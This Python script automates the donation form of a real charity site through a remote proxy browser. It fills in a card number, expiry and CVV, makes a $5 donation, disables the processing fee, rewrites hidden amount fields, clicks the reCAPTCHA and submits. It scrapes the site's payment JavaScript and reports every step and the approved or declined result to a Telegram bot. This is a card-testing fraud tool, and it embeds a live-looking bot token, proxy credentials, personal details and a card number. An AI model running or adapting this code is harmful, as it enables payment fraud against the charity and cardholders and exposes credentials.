#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gift of Life Donation v14 — extract JS + debug card fields
"""

import os
import time
import json
import requests
import traceback
import re

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    os.system("pip install playwright")
    os.system("playwright install chromium")
    from playwright.sync_api import sync_playwright

BOT_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
CHAT_ID = 6843321125

BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"

TARGET_URL = "https://gift-of-life.org/make-a-donation/"

FIRST_NAME = "Wafa"
LAST_NAME = "Bro"
EMAIL = "wafabro980@gmail.com"
PHONE = "2019679866"
ADDRESS_1 = "W356"
ADDRESS_2 = "Apt 12"
CITY = "Carifnia"
STATE_VALUE = "1305"
ZIP = "90011"

CARD_NUMBER = "5178057879094972"
CARD_NAME = "Wafa Bro"
CARD_MONTH = "08"
CARD_YEAR = "2030"
CARD_CVV = "123"
CARD_TYPE = "MasterCard"

DONATION_AMOUNT = "5"

P = "_ArrevaOnlineDonationsPortlet_WAR_ArrevaOnlineDonationsPortlet_:form1:"


def sid(name):
    return f'[id="{P}{name}"]'


def tg_msg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text[:4000], "parse_mode": "HTML"},
            timeout=15
        )
    except Exception as e:
        print(f"TG msg error: {e}", flush=True)


def tg_photo(path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={"chat_id": CHAT_ID, "caption": caption[:1000]},
                files={"photo": f},
                timeout=30
            )
    except Exception as e:
        print(f"TG photo error: {e}", flush=True)


def tg_long(label, text, chunk=3500):
    tg_msg(f"{label} (len={len(text)})")
    for i in range(0, len(text), chunk):
        tg_msg(f"<pre>{text[i:i+chunk]}</pre>")
        time.sleep(0.3)


def find_donation_frame(page, total_seconds=120):
    start = time.time()
    attempt = 0
    while time.time() - start < total_seconds:
        attempt += 1
        for f in page.frames:
            try:
                if f.locator('[id*="datafirst"]').first.count() > 0:
                    tg_msg(f"✅ Found form in frame name='{f.name}'")
                    return f, attempt
            except Exception:
                pass
        time.sleep(2)
    return None, attempt


def check_reject_in_text(text):
    for line in text.split("\n"):
        l = line.strip()
        if "REJECT" in l.upper() or "DECLINED" in l.upper():
            return l
    return None


# ═══════════════════════════════════════════════════
#  EXTRACT JS FILES
# ═══════════════════════════════════════════════════

def fetch_js_files(frame, js_urls, page):
    """ينزّل كل JS files ويبعت محتواها"""
    tg_msg(f"🔄 Fetching {len(js_urls)} JS files...")
    
    for i, url in enumerate(js_urls):
        try:
            tg_msg(f"📥 [{i+1}/{len(js_urls)}] {url[-80:]}")
            resp = page.request.get(url, timeout=30000)
            if resp.status == 200:
                js_content = resp.text()
                # ابعت بس الملفات اللي فيها card/payment/cvv
                keywords = ["cardNumber", "cardCSV", "cvv", "payment", "token", "encrypt", "cc-number"]
                if any(k.lower() in js_content.lower() for k in keywords):
                    tg_long(f"📄 JS [{i+1}] {url.split('/')[-1]}", js_content)
                else:
                    tg_msg(f"⏭️ Skipped (no keywords): {url.split('/')[-1]}")
            else:
                tg_msg(f"⚠️ [{i+1}] Status {resp.status}")
        except Exception as e:
            tg_msg(f"❌ [{i+1}] {str(e)[:100]}")


# ═══════════════════════════════════════════════════
#  FILL FUNCTIONS
# ═══════════════════════════════════════════════════

def fill_text_field(frame, field_suffix, value, label=""):
    try:
        el = frame.locator(sid(field_suffix)).first
        el.wait_for(state="visible", timeout=10000)
        el.fill(str(value), timeout=5000)
        el.evaluate("el => el.dispatchEvent(new Event('input',{bubbles:true}))")
        actual = frame.evaluate(
            "(id) => { const el = document.getElementById(id); return el ? el.value : null; }",
            f"{P}{field_suffix}"
        )
        tg_msg(f"{'✅' if actual == str(value) else '⚠️'} {label or field_suffix}: '{actual}'")
        return actual == str(value)
    except Exception as e:
        tg_msg(f"❌ {label or field_suffix}: {str(e)[:150]}")
        return False


def remove_processing_fee(frame):
    try:
        result = frame.evaluate(
            f"""() => {{
                const P = '{P}';
                const cb = document.getElementById(P + 'includeFee_input');
                if (!cb) return {{found: false}};
                if (cb.checked) cb.click();
                if (cb.checked) {{
                    cb.checked = false;
                    cb.dispatchEvent(new Event('change', {{bubbles: true}}));
                }}
                return {{found: true, checked: cb.checked}};
            }}"""
        )
        tg_msg(f"✅ includeFee: {json.dumps(result, ensure_ascii=False)}")
        return result.get("checked") == False
    except Exception as e:
        tg_msg(f"❌ remove fee: {str(e)[:150]}")
        return False


def set_amount_exact(frame, amount):
    tg_msg(f"🔄 Setting exact amount = ${amount}")
    
    try:
        frame.evaluate(
            f"""() => {{
                const rb = document.getElementById('{P}rb_amount:4');
                if (rb) {{
                    rb.checked = true;
                    rb.dispatchEvent(new Event('change', {{bubbles: true}}));
                }}
            }}"""
        )
        tg_msg("✅ Other radio checked")
    except Exception as e:
        tg_msg(f"⚠️ Other: {str(e)[:120]}")
    
    time.sleep(3)
    
    try:
        frame.evaluate(
            """(amt) => {
                const el = document.querySelector('input[id*="other_amount"]');
                if (!el) return false;
                el.value = amt;
                el.dispatchEvent(new Event('input', {bubbles: true}));
                el.dispatchEvent(new Event('change', {bubbles: true}));
                return true;
            }""",
            str(amount)
        )
        tg_msg(f"✅ other_amount = {amount}")
    except Exception as e:
        tg_msg(f"❌ other_amount: {str(e)[:120]}")
    
    time.sleep(3)
    remove_processing_fee(frame)
    time.sleep(2)
    
    total = float(amount)
    try:
        frame.evaluate(
            f"""(total) => {{
                const P = '{P}';
                const atp = document.getElementById(P + 'amount_to_pay');
                if (atp) atp.value = total.toFixed(2);
                const lt = document.getElementById('label_total_amount');
                if (lt) lt.value = '$ ' + total.toFixed(2);
                const lth = document.getElementById(P + 'label_total_hidden_amount');
                if (lth) lth.value = '$ ' + total.toFixed(2);
                const lp = document.getElementById(P + 'label_payment_amount');
                if (lp) lp.value = '$ ' + total.toFixed(2);
                const oao = document.getElementById(P + 'other_amount_on');
                if (oao) oao.value = 'true';
                const fa = document.getElementById(P + 'fee_amount');
                if (fa) fa.value = '0.00';
            }}""",
            total
        )
        tg_msg(f"✅ hidden fields updated: ${total:.2f}")
    except Exception as e:
        tg_msg(f"❌ hidden: {str(e)[:150]}")
    
    time.sleep(2)
    
    try:
        check = frame.evaluate(
            f"""() => {{
                const P = '{P}';
                return {{
                    other: document.querySelector('input[id*="other_amount"]')?.value,
                    total_label: document.getElementById('label_total_amount')?.value,
                    amount_to_pay: document.getElementById(P + 'amount_to_pay')?.value,
                    payment_amount: document.getElementById(P + 'label_payment_amount')?.value,
                    includeFee: document.getElementById(P + 'includeFee_input')?.checked,
                    fee_amount: document.getElementById(P + 'fee_amount')?.value,
                }};
            }}"""
        )
        tg_msg(f"📋 Amount state: {json.dumps(check, ensure_ascii=False)}")
    except Exception:
        pass


def debug_card_field(frame, field_suffix, value, label=""):
    """
    يحاول 6 طرق لملء الحقل + يطبع سلوك الفورم
    """
    tg_msg(f"🔍 DEBUG {label} ({field_suffix})")
    
    field_id = f"{P}{field_suffix}"
    
    # 0. اطبع معلومات الحقل الأولية
    try:
        initial = frame.evaluate(
            """(id) => {
                const el = document.getElementById(id);
                if (!el) return {found: false};
                return {
                    found: true,
                    type: el.type,
                    maxlength: el.maxLength,
                    name: el.name,
                    id: el.id,
                    readOnly: el.readOnly,
                    disabled: el.disabled,
                    value: el.value,
                    oninput: !!el.oninput,
                    onchange: !!el.onchange,
                    onblur: !!el.onblur,
                    onkeyup: !!el.onkeyup,
                    onkeydown: !!el.onkeydown,
                    onpaste: !!el.onpaste,
                    classes: el.className,
                    parentHTML: el.parentElement ? el.parentElement.outerHTML.slice(0, 300) : '',
                };
            }""",
            field_id
        )
        tg_msg(f"📋 {label} initial: {json.dumps(initial, ensure_ascii=False)[:1500]}")
    except Exception as e:
        tg_msg(f"⚠️ initial: {str(e)[:150]}")
    
    # 1. غير type لـ text + املأ
    methods = []
    
    # Method 1: type=text + fill
    try:
        frame.evaluate("""(id) => {
            const el = document.getElementById(id);
            if (el) { el.type = 'text'; el.removeAttribute('maxlength'); }
        }""", field_id)
        el = frame.locator(f'[id="{field_id}"]').first
        el.fill(str(value), timeout=5000)
        actual = frame.evaluate("(id) => document.getElementById(id)?.value", field_id)
        methods.append(("M1 type=text+fill", actual))
        tg_msg(f"M1: '{actual}'")
    except Exception as e:
        methods.append(("M1", f"ERR:{str(e)[:80]}"))
        tg_msg(f"M1 ERR: {str(e)[:120]}")
    
    # 2. keyboard type
    try:
        el = frame.locator(f'[id="{field_id}"]').first
        el.click(timeout=3000)
        el.fill("", timeout=2000)
        frame.page.keyboard.type(str(value), delay=50)
        actual = frame.evaluate("(id) => document.getElementById(id)?.value", field_id)
        methods.append(("M2 keyboard", actual))
        tg_msg(f"M2: '{actual}'")
    except Exception as e:
        methods.append(("M2", f"ERR:{str(e)[:80]}"))
        tg_msg(f"M2 ERR: {str(e)[:120]}")
    
    # 3. JS value + input + change + keyup + paste
    try:
        frame.evaluate("""([id, val]) => {
            const el = document.getElementById(id);
            if (!el) return;
            el.focus();
            el.value = val;
            ['input','change','keyup','keydown','paste','beforeinput'].forEach(evt => {
                try { el.dispatchEvent(new Event(evt, {bubbles: true})); } catch(e){}
            });
        }""", [field_id, str(value)])
        actual = frame.evaluate("(id) => document.getElementById(id)?.value", field_id)
        methods.append(("M3 JS+events", actual))
        tg_msg(f"M3: '{actual}'")
    except Exception as e:
        methods.append(("M3", f"ERR:{str(e)[:80]}"))
        tg_msg(f"M3 ERR: {str(e)[:120]}")
    
    # 4. JS only (no events) - ونطبع لو الفورم مسح القيمة
    try:
        frame.evaluate("""([id, val]) => {
            const el = document.getElementById(id);
            if (!el) return;
            el.value = val;
        }""", [field_id, str(value)])
        actual = frame.evaluate("(id) => document.getElementById(id)?.value", field_id)
        methods.append(("M4 JS only", actual))
        tg_msg(f"M4: '{actual}'")
        
        # استنى 2 ثانية وشوف لو الفورم مسحها
        time.sleep(2)
        actual2 = frame.evaluate("(id) => document.getElementById(id)?.value", field_id)
        methods.append(("M4-after 2s", actual2))
        tg_msg(f"M4 after 2s: '{actual2}'")
    except Exception as e:
        methods.append(("M4", f"ERR:{str(e)[:80]}"))
        tg_msg(f"M4 ERR: {str(e)[:120]}")
    
    # 5. execCommand insertText (يحاكي الكيبورد)
    try:
        el = frame.locator(f'[id="{field_id}"]').first
        el.click(timeout=3000)
        el.fill("", timeout=2000)
        frame.evaluate("""([id, val]) => {
            const el = document.getElementById(id);
            if (!el) return;
            el.focus();
            document.execCommand('insertText', false, val);
        }""", [field_id, str(value)])
        actual = frame.evaluate("(id) => document.getElementById(id)?.value", field_id)
        methods.append(("M5 execCommand", actual))
        tg_msg(f"M5: '{actual}'")
    except Exception as e:
        methods.append(("M5", f"ERR:{str(e)[:80]}"))
        tg_msg(f"M5 ERR: {str(e)[:120]}")
    
    # 6. type=text + keyboard.type
    try:
        frame.evaluate("""(id) => {
            const el = document.getElementById(id);
            if (el) el.type = 'text';
        }""", field_id)
        el = frame.locator(f'[id="{field_id}"]').first
        el.click(timeout=3000)
        el.fill("", timeout=2000)
        frame.page.keyboard.type(str(value), delay=30)
        actual = frame.evaluate("(id) => document.getElementById(id)?.value", field_id)
        methods.append(("M6 type+keyboard", actual))
        tg_msg(f"M6: '{actual}'")
    except Exception as e:
        methods.append(("M6", f"ERR:{str(e)[:80]}"))
        tg_msg(f"M6 ERR: {str(e)[:120]}")
    
    # اطبع النتيجة النهائية
    tg_msg(f"📊 {label} results:\n" + "\n".join(f"  {m[0]}: '{m[1]}'" for m in methods))
    
    # تحقق نهائي
    final_value = frame.evaluate("(id) => document.getElementById(id)?.value", field_id)
    return final_value


def select_option_safe(frame, field_suffix, value, label=""):
    try:
        ok = frame.evaluate(
            """([id, val]) => {
                const el = document.getElementById(id);
                if (!el) return false;
                el.value = val;
                el.dispatchEvent(new Event('change', {bubbles: true}));
                return true;
            }""",
            [f"{P}{field_suffix}", value]
        )
        tg_msg(f"{'✅' if ok else '❌'} {label or field_suffix}: '{value}'")
        return ok
    except Exception as e:
        tg_msg(f"❌ {label or field_suffix}: {str(e)[:150]}")
        return False


def solve_captcha_once(frame, page):
    tg_msg("🔄 [7] reCAPTCHA")
    try:
        token = frame.evaluate("""() => {
            const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
            return ta ? ta.value : '';
        }""")
        tg_msg(f"📌 Token len = {len(token) if token else 0}")
        if token and len(token) > 20:
            return True
    except Exception:
        pass

    try:
        for f in page.frames:
            try:
                if "recaptcha/api2/anchor" in (f.url or ""):
                    cb = f.locator("#recaptcha-anchor").first
                    cb.wait_for(state="attached", timeout=8000)
                    cb.click(force=True, timeout=5000)
                    tg_msg("✅ Clicked reCAPTCHA")
                    break
            except Exception:
                continue

        for i in range(25):
            try:
                token = frame.evaluate("""() => {
                    const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
                    return ta ? ta.value : '';
                }""")
                if token and len(token) > 20:
                    tg_msg(f"✅ reCAPTCHA solved! len={len(token)}")
                    return True
            except Exception:
                pass
            time.sleep(1)
        tg_msg("⚠️ reCAPTCHA still empty")
        return False
    except Exception as e:
        tg_msg(f"⚠️ reCAPTCHA: {str(e)[:150]}")
        return False


def run():
    tg_msg("🚀 Gift of Life Donation v14 — Extract JS + Debug Card")

    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"

    try:
        pw = sync_playwright().start()
        browser = pw.chromium.connect_over_cdp(cdp_url, timeout=120000)
        tg_msg("✅ Connected")
    except Exception as e:
        tg_msg(f"❌ Connect: {str(e)[:200]}")
        return

    context = browser.new_context(
        viewport={"width": 1366, "height": 900},
        user_agent=("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"),
        locale="en-US",
    )
    page = context.new_page()
    page.set_default_timeout(60000)

    tg_msg("🔄 [1] Opening...")
    try:
        page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=60000)
        time.sleep(10)
    except Exception as e:
        tg_msg(f"❌ Load: {str(e)[:200]}")
        return
    tg_msg("✅ Page loaded")

    tg_msg("🔄 [2] Finding form...")
    frame, attempts = find_donation_frame(page, 120)
    if not frame:
        try:
            page.reload(wait_until="domcontentloaded", timeout=60000)
            time.sleep(15)
        except Exception:
            pass
        frame, attempts = find_donation_frame(page, 90)
    if not frame:
        tg_msg("❌ not found")
        return
    tg_msg(f"✅ frame='{frame.name}'")
    time.sleep(5)

    # 3. استخرج JS files
    tg_msg("🔄 [3] Extracting JS files...")
    try:
        js_urls = frame.evaluate("""() => {
            return Array.from(document.querySelectorAll('script[src]'))
                .map(s => s.src)
                .filter(u => u.includes('Arreva') || u.includes('donation') || u.includes('payment') || u.includes('deluxe'));
        }""")
        tg_msg(f"🔎 Found {len(js_urls)} JS files")
        fetch_js_files(frame, js_urls, page)
    except Exception as e:
        tg_msg(f"⚠️ JS extract: {str(e)[:150]}")

    # 4. المبلغ
    tg_msg("🔄 [4] Setting amount...")
    set_amount_exact(frame, DONATION_AMOUNT)

    # 5. بيانات المتبرع
    tg_msg("🔄 [5] Donor info...")
    fill_text_field(frame, "datafirst", FIRST_NAME, "First name")
    fill_text_field(frame, "datalast", LAST_NAME, "Last name")
    fill_text_field(frame, "email", EMAIL, "Email")
    fill_text_field(frame, "data_phone", PHONE, "Phone")
    fill_text_field(frame, "data_address_one", ADDRESS_1, "Address")
    fill_text_field(frame, "data_address_two", ADDRESS_2, "Apt/Suite")
    fill_text_field(frame, "data_address_city", CITY, "City")
    fill_text_field(frame, "data_address_zip", ZIP, "Zip")

    try:
        us_value = frame.evaluate(f"""() => {{
            const sel = document.querySelector('select[id="{P}data_Rcountry"]');
            if (!sel) return null;
            for (const o of sel.options) {{
                const t = o.text.trim().toLowerCase();
                if (t === 'united states' || t === 'usa' || t === 'us') return o.value;
            }}
            return null;
        }}""")
        if us_value:
            select_option_safe(frame, "data_Rcountry", us_value, f"Country (US={us_value})")
    except Exception as e:
        tg_msg(f"⚠️ Country: {str(e)[:150]}")

    select_option_safe(frame, "data_Rstate", STATE_VALUE, "State (CA)")

    # 6. DEBUG بطاقة - 6 طرق
    tg_msg("🔄 [6] DEBUG card fields...")
    fill_text_field(frame, "nameOnCard", CARD_NAME, "Card name")
    
    # debug card number
    debug_card_field(frame, "cardNumber", CARD_NUMBER, "Card number")
    debug_card_field(frame, "cardCSV", CARD_CVV, "CVV")
    
    select_option_safe(frame, "cardType", CARD_TYPE, "Card type")
    select_option_safe(frame, "expiration_date_month", CARD_MONTH, "Exp month")
    select_option_safe(frame, "expiration_date_year", CARD_YEAR, "Exp year")

    # 7. screenshot
    try:
        page.screenshot(path="/tmp/before_captcha.png", full_page=True)
        tg_photo("/tmp/before_captcha.png", "📸 Before captcha")
    except Exception:
        pass

    # 8. reCAPTCHA
    captcha_ok = solve_captcha_once(frame, page)

    # 9. Pre-submit
    tg_msg("🔄 [9] Verifying...")
    try:
        vals = frame.evaluate(f"""() => {{
            const g = (n) => {{
                const el = document.getElementById('{P}' + n);
                return el ? el.value : null;
            }};
            return {{
                card_num_len: (g('cardNumber') || '').length,
                cvv_len: (g('cardCSV') || '').length,
                amount_to_pay: g('amount_to_pay'),
                includeFee: document.getElementById('{P}includeFee_input')?.checked,
                recaptcha_len: (g('g-recaptcha-response') || '').length,
            }};
        }}""")
        tg_msg(f"📋 Pre-submit:\n<pre>{json.dumps(vals, indent=1, ensure_ascii=False)}</pre>")
    except Exception as e:
        tg_msg(f"⚠️ Verify: {str(e)[:150]}")

    # 10. Submit
    tg_msg("🔄 [10] Clicking Submit...")
    try:
        btn = frame.locator(sid("j_idt1913")).first
        btn.wait_for(state="visible", timeout=10000)
        btn.click(timeout=5000)
        tg_msg("✅ Submit clicked")
    except Exception as e:
        tg_msg(f"⚠️ Submit: {str(e)[:150]}")

    time.sleep(10)

    # 11. النتيجة
    tg_msg("🔄 [11] Reading result...")
    time.sleep(10)

    try:
        page.screenshot(path="/tmp/result.png", full_page=True)
        tg_photo("/tmp/result.png", "📸 Result")
    except Exception:
        pass

    try:
        iframe_text = frame.evaluate("() => document.body.innerText")
        lines = []
        for line in iframe_text.split("\n"):
            l = line.strip()
            if any(k in l.lower() for k in ["success","approved","declin","error","invalid",
                                             "thank","confirm","failed","reject","captcha",
                                             "verified","otp","verification","limit","enter"]):
                lines.append(l)
        if lines:
            tg_msg("📊 Result:\n" + "\n".join(lines[:25]))
    except Exception as e:
        tg_msg(f"⚠️ read: {str(e)[:150]}")

    tg_msg("✅ DONE")

    try: context.close()
    except: pass
    try: browser.close()
    except: pass
    try: pw.stop()
    except: pass


if __name__ == "__main__":
    try:
        run()
    except Exception as e:
        tg_msg(f"❌ FATAL:\n{traceback.format_exc()[:3500]}")
